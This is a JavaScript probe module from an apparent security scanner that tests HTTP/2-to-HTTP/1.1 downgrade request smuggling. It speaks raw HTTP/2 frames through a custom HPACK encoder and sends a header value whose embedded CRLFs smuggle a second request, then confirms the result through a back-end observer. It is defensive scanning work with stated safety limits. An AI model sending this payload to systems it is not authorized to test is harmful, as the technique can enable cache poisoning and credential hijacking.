// Dark Matter rule-based scanner — HTTP/2 request tunnelling,
// H2→H1 downgrade CRLF smuggling.
// (Coverage row #505 [High] HTTP/2 tunnelling, CWE-444;
// phase 'smuggling-h2-tunnel'.)
//
// A front-end that terminates HTTP/2 and forwards to an HTTP/1.1
// back-end must sanitise header values when it re-serialises them
// as HTTP/1.1. If a CRLF inside an H2 header value survives the
// downgrade, the bytes after the CRLF become a new HTTP/1.1 request
// on the back-end connection — a smuggled request the attacker
// controls.
//
// WHY RAW FRAMES: Node's node:http2 client validates header values
// and refuses \r / \n outright (ERR_INVALID_CHAR), so the public
// API cannot send the probe at all. This probe therefore speaks
// HTTP/2 directly over a raw node:net socket: connection preface,
// SETTINGS, and a HEADERS frame whose HPACK block carries the
// CRLF-bearing header. The HPACK codec below is minimal but exact
// for what the probe sends and what a server replies (literal
// fields without indexing, indexed static-table fields, SETTINGS
// ack). No h2c upgrade, no prior-knowledge shortcuts beyond the
// standard preface.
//
// ORACLE: two legs, both required, and a finding fires ONLY when
// the smuggled request is observed reaching the back-end:
//   Leg 1 (baseline): a clean H2 request (no CRLF) must return a
//     200-class :status. If the target does not speak H2 at all
//     (connection refused, garbage, timeout, GOAWAY on preface)
//     the phase SKIPS gracefully — never a finding.
//   Leg 2 (attack): the same request with header value
//     "dmprobe\r\nGET /dm-smuggled HTTP/1.1\r\nHost: …\r\n\r\n".
//     Confirmed ONLY if (a) the lab back-end observer reports the
//     smuggled request (opts.smuggledObserver(ms) resolves true —
//     the mock back-end in tests, a lab backend tap in production
//     wiring), or (b) a second response arrives on a stream other
//     than the attack stream. A GOAWAY / RST_STREAM / connection
//     error on the attack leg means the front-end refused the
//     input — safe, never a finding. A 200 with no smuggled
//     observation means the front-end sanitised or dropped the
//     CRLF — also never a finding.
//   The probe NEVER confirms on "the server accepted a weird
//   header" alone: acceptance without a smuggled request is not
//   a downgrade.
//
// SAFETY: plain h2c only (cleartext HTTP/2; https/ALPN is out of
// scope). Tiny request, one header value, one smuggled request
// line to a non-existent path (/dm-smuggled) that a lab back-end
// records and 404s. No floods, no cache poisoning.
//
// HONEST LIMITS: no dedicated H2 lab exists today — verified
// against local raw-socket mock H2 servers only (a downgrading
// stub that records the smuggled request, a sanitising stub, and
// a GOAWAY stub) plus a plain HTTP/1.1 server for the skip path.
// A live H2 front-end proof is a later lane. The confirmation
// needs a back-end observer: without opts.smuggledObserver the
// probe can only see an extra-stream response, which most
// downgraders do not produce — so unwired, the phase reports
// "no observer" and stays quiet rather than guessing. The probe
// does not cover HTTP/2 CONTINUATION flooding or HPACK bomb
// shapes (DoS-class, excluded repo-wide).

import net from 'node:net';

const TIMEOUT_MS = 8000;
const PREFACE = 'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n';
const SMUGGLED_PATH = '/dm-smuggled';

// ---- minimal HPACK (RFC 7541) — pure helpers, exported for tests --------

const STATIC_TABLE = {
  1: [':authority', ''],
  2: [':method', 'GET'],
  3: [':method', 'POST'],
  4: [':path', '/'],
  5: [':path', '/index.html'],
  6: [':scheme', 'http'],
  7: [':scheme', 'https'],
  8: [':status', '200'],
  9: [':status', '204'],
  10: [':status', '206'],
  11: [':status', '304'],
  12: [':status', '400'],
  13: [':status', '404'],
  14: [':status', '500'],
};

/** Encode an integer with an N-bit prefix (RFC 7541 §5.1). Pure. */
export function encodeHpackInteger(value, prefixBits) {
  const maxPrefix = (1 << prefixBits) - 1;
  if (value < maxPrefix) return Buffer.from([value]);
  const out = [maxPrefix];
  let v = value - maxPrefix;
  while (v >= 128) {
    out.push((v % 128) + 128);
    v = Math.floor(v / 128);
  }
  out.push(v);
  return Buffer.from(out);
}

/** Read an integer with an N-bit prefix starting at `offset`.
// Returns { value, next } where next is the offset after the integer. Pure. */
export function readHpackInteger(buf, offset, prefixBits) {
  const maxPrefix = (1 << prefixBits) - 1;
  let value = buf[offset] & maxPrefix;
  let next = offset + 1;
  if (value < maxPrefix) return { value, next };
  let shift = 0;
  for (;;) {
    const b = buf[next];
    next += 1;
    value += (b & 0x7f) * 2 ** shift;
    shift += 7;
    if ((b & 0x80) === 0) break;
  }
  return { value, next };
}

/** Encode one literal header field without indexing, new name
 *  (RFC 7541 §6.2.2). Pure. */
export function encodeHpackLiteral(name, value) {
  const nameBuf = Buffer.from(name, 'latin1');
  const valueBuf = Buffer.from(value, 'latin1');
  // First byte 0x00 = literal without indexing, name index 0 (new
  // name); the name length then follows as its own 7-bit integer.
  return Buffer.concat([
    Buffer.from([0x00]),
    encodeHpackInteger(nameBuf.length, 7),
    nameBuf,
    encodeHpackInteger(valueBuf.length, 7),
    valueBuf,
  ]);
}

/** Encode an indexed static-table field. Pure. */
export function encodeHpackIndexed(index) {
  const buf = encodeHpackInteger(index, 7);
  buf[0] |= 0x80;
  return buf;
}

/**
 * Decode an HPACK header block into [[name, value], ...]. Handles
 * indexed fields, literals with/without/never indexing (new name or
 * indexed name), and dynamic-table-size updates. Huffman-coded
 * strings are refused (the probe never sends them; a server reply
 * using Huffman aborts the decode rather than misreading it). Pure.
 */
export function decodeHpackBlock(buf) {
  const fields = [];
  const dynamic = [];
  let i = 0;
  const readString = () => {
    const huffman = (buf[i] & 0x80) !== 0;
    if (huffman) throw new Error('huffman-coded HPACK string not supported');
    const { value: len, next } = readHpackInteger(buf, i, 7);
    i = next;
    const s = buf.slice(i, i + len).toString('latin1');
    i += len;
    return s;
  };
  const readName = (prefixBits) => {
    const { value: idx, next } = readHpackInteger(buf, i, prefixBits);
    i = next;
    if (idx === 0) return readString();
    if (idx <= 14 && STATIC_TABLE[idx]) return STATIC_TABLE[idx][0];
    const dyn = dynamic[idx - 62];
    if (dyn) return dyn[0];
    throw new Error(`unknown HPACK index ${idx}`);
  };
  while (i < buf.length) {
    const b = buf[i];
    if (b & 0x80) {
      const { value: idx, next } = readHpackInteger(buf, i, 7);
      i = next;
      const entry = STATIC_TABLE[idx] || dynamic[idx - 62];
      if (!entry) throw new Error(`unknown HPACK index ${idx}`);
      fields.push([entry[0], entry[1]]);
    } else if (b & 0x40) {
      const name = readName(6);
      const value = readString();
      dynamic.unshift([name, value]);
      fields.push([name, value]);
    } else if (b & 0x20) {
      const { next } = readHpackInteger(buf, i, 5);
      i = next;
    } else if (b & 0x10) {
      const name = readName(4);
      const value = readString();
      fields.push([name, value]);
    } else {
      const name = readName(4);
      const value = readString();
      fields.push([name, value]);
    }
  }
  return fields;
}

/** Encode one HTTP/2 frame (9-byte header + payload). Pure. */
export function encodeFrame(type, flags, streamId, payload) {
  const body = Buffer.isBuffer(payload) ? payload : Buffer.from(payload || '');
  const head = Buffer.alloc(9);
  head.writeUIntBE(body.length, 0, 3);
  head[3] = type;
  head[4] = flags;
  head.writeUInt32BE(streamId & 0x7fffffff, 5);
  return Buffer.concat([head, body]);
}

/** The CRLF-bearing header value used by the attack leg. Pure. */
export function crlfHeaderValue(host) {
  return `dmprobe\r\nGET ${SMUGGLED_PATH} HTTP/1.1\r\nHost: ${host}\r\nX-Dm-Smuggled: 1\r\n\r\n`;
}

// ---- raw HTTP/2 session over a plain socket ---------------------------------

function targetParts(url) {
  const u = new URL(url);
  return {
    host: u.hostname,
    port: u.port ? Number(u.port) : u.protocol === 'https:' ? 443 : 80,
    tls: u.protocol === 'https:',
    path: u.pathname + u.search || '/',
  };
}

// One H2 exchange: connect, preface + SETTINGS, send one HEADERS frame
// on stream 1, collect frames until `done` returns true or the
// deadline passes. Resolves { status, extraStreams, rejected, error }.
function h2Exchange(host, port, headerBlock, timeoutMs) {
  return new Promise((resolve) => {
    const deadline = Date.now() + timeoutMs;
    const result = { status: null, extraStreams: new Set(), rejected: false, error: false };
    let settled = false;
    const finish = () => {
      if (settled) return;
      settled = true;
      try { sock.destroy(); } catch { /* ignore */ }
      resolve({ ...result, extraStreams: [...result.extraStreams] });
    };
    const sock = net.createConnection({ host, port });
    let buf = Buffer.alloc(0);
    let settingsAcked = false;
    let headersSent = false;
    const timer = setInterval(() => {
      if (Date.now() >= deadline) {
        clearInterval(timer);
        finish();
      }
    }, 25);
    const pump = () => {
      while (buf.length >= 9) {
        const len = buf.readUIntBE(0, 3);
        if (buf.length < 9 + len) return;
        const type = buf[3];
        const flags = buf[4];
        const streamId = buf.readUInt32BE(5) & 0x7fffffff;
        const payload = buf.slice(9, 9 + len);
        buf = buf.slice(9 + len);
        if (type === 0x4 && (flags & 0x1) === 0) {
          // Peer SETTINGS: ack it (once per exchange is enough).
          try { sock.write(encodeFrame(0x4, 0x1, 0, Buffer.alloc(0))); } catch { /* ignore */ }
        } else if (type === 0x1) {
          // HEADERS: decode for :status; any stream other than 1 is
          // a second response — the smuggled request answered.
          if (streamId !== 1) result.extraStreams.add(streamId);
          try {
            for (const [name, value] of decodeHpackBlock(payload)) {
              if (name === ':status' && streamId === 1) result.status = Number(value);
            }
          } catch { /* undecodable HEADERS: ignore, keep the frame count */ }
        } else if (type === 0x7 || type === 0x3) {
          // GOAWAY or RST_STREAM: the peer refused the input.
          result.rejected = true;
        }
        if (result.status !== null && settingsAcked) {
          // Baseline/attack answer received; a little grace for a
          // trailing extra-stream response, then finish.
          setTimeout(() => { clearInterval(timer); finish(); }, 150).unref?.();
        }
      }
    };
    sock.on('connect', () => {
      try {
        sock.write(Buffer.concat([Buffer.from(PREFACE, 'latin1'), encodeFrame(0x4, 0, 0, Buffer.alloc(0))]));
        settingsAcked = true;
        sock.write(encodeFrame(0x1, 0x5, 1, headerBlock)); // END_HEADERS | END_STREAM
        headersSent = true;
      } catch {
        result.error = true;
        clearInterval(timer);
        finish();
      }
    });
    sock.on('data', (chunk) => {
      buf = Buffer.concat([buf, chunk]);
      pump();
      if (!headersSent && settingsAcked) {
        // unreachable in practice; kept so a connect-then-write
        // failure cannot leave the exchange hanging.
      }
    });
    sock.on('error', () => {
      result.error = true;
      clearInterval(timer);
      finish();
    });
    sock.on('close', () => {
      clearInterval(timer);
      finish();
    });
  });
}

function cleanHeaderBlock(host, path) {
  return Buffer.concat([
    encodeHpackIndexed(2), // :method GET
    encodeHpackLiteral(':path', path),
    encodeHpackLiteral(':scheme', 'http'),
    encodeHpackLiteral(':authority', host),
    encodeHpackLiteral('user-agent', 'DarkMatter-Scanner/1.0 (+authorized-scan)'),
  ]);
}

function attackHeaderBlock(host, path) {
  return Buffer.concat([
    encodeHpackIndexed(2), // :method GET
    encodeHpackLiteral(':path', path),
    encodeHpackLiteral(':scheme', 'http'),
    encodeHpackLiteral(':authority', host),
    encodeHpackLiteral('user-agent', 'DarkMatter-Scanner/1.0 (+authorized-scan)'),
    encodeHpackLiteral('x-dm-tunnel', crlfHeaderValue(host)),
  ]);
}

// ---- the probe ---------------------------------------------------------------

export async function probeSmugglingH2Tunnel(url, opts = {}) {
  const findings = [];
  const diag = opts && typeof opts.diagnostics === 'object' && opts.diagnostics ? opts.diagnostics : null;
  const setDiag = (k, v) => {
    if (diag) diag[k] = v;
  };
  const { host, port, tls, path } = targetParts(url);
  if (tls) {
    setDiag('skipped', 'https unsupported (h2c cleartext only, no TLS/ALPN)');
    return findings;
  }
  const timeoutMs = opts.timeoutMs || TIMEOUT_MS;

  // Leg 1 — baseline: the target must speak H2 and answer cleanly.
  const baseline = await h2Exchange(host, port, cleanHeaderBlock(host, path), Math.min(timeoutMs, 4000));
  setDiag('h2Available', baseline.status !== null && !baseline.error);
  setDiag('baselineStatus', baseline.status);
  if (baseline.error || baseline.status === null || baseline.status >= 400) {
    setDiag('skipped', 'no HTTP/2 surface — clean H2 request got no usable answer');
    return findings;
  }

  // Leg 2 — attack: CRLF-bearing header over a fresh H2 connection.
  const attack = await h2Exchange(host, port, attackHeaderBlock(host, path), Math.min(timeoutMs, 4000));
  setDiag('attackStatus', attack.status);
  setDiag('attackRejected', attack.rejected);
  if (attack.rejected) {
    setDiag('verdict', 'rejected — front-end refused the CRLF input');
    return findings;
  }

  // Confirmation: the back-end observer saw the smuggled request, or
  // a second response arrived on another stream. Nothing else counts.
  let observed = attack.extraStreams.length > 0;
  setDiag('extraStreams', attack.extraStreams);
  if (!observed && typeof opts.smuggledObserver === 'function') {
    try {
      observed = (await opts.smuggledObserver(opts.oobWaitTimeoutMs || 3000)) === true;
    } catch {
      observed = false;
    }
  } else if (!observed) {
    setDiag('noObserver', true);
  }
  setDiag('smuggledObserved', observed);
  if (!observed) return findings;

  findings.push({
    class: 'request_smuggling',
    id: 'request-smuggling-h2-tunnel',
    title: 'HTTP/2 request tunnelling (H2→H1 downgrade CRLF smuggling proven)',
    severity: 'high',
    url,
    evidence: {
      request: `H2 HEADERS with x-dm-tunnel: "dmprobe\\r\\nGET ${SMUGGLED_PATH} HTTP/1.1\\r\\nHost: ${host}\\r\\n\\r\\n" (raw HTTP/2 frames, h2c)`,
      response: `clean H2 baseline answered :status ${baseline.status}; attack leg answered :status ${attack.status}; the smuggled request ${SMUGGLED_PATH} reached the back-end${attack.extraStreams.length ? ` (extra response on stream ${attack.extraStreams[0]})` : ' (back-end observer recorded it)'} — the front-end downgraded to HTTP/1.1 without sanitising the CRLF`,
      impact_demo: 'attacker-controlled request smuggled past the H2 front-end onto the back-end connection — cache poisoning / credential hijack primitive',
      signalCorrelated: true,
    },
  });
  return findings;
}

export const __smugglingH2TunnelMeta = { phases: ['smuggling-h2-tunnel'], depth: ['standard', 'deep'] };
